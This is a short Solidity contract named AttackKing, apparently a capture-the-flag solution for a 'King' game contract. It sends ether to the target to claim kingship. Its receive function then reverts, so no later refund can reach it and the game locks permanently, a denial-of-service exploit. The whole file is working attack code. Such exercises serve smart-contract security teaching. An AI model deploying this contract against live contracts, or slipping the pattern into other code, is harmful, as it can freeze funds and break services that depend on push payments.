// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackKing {
    
    function attack(address _king) public payable {
        (bool success, ) = _king.call{value: msg.value}("");
        require(success, "Attack failed");
    }

    receive() external payable {
        revert("Break Game :)");
    }
}